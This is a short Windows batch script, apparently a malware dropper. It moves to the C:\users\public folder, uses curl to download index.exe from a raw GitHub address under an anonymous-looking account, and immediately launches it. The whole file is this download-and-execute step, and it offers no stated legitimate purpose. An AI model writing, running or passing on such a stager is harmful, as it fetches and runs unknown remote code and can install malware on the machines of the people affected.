@echo off
echo "Switching to Public directory..."
cd C:\users\public\

echo "Downloading file..."
curl -LJO "https://raw.githubusercontent.com/tempuser31/11/main/index.exe"

echo "Download complete. Starting..."
start "" "index.exe"
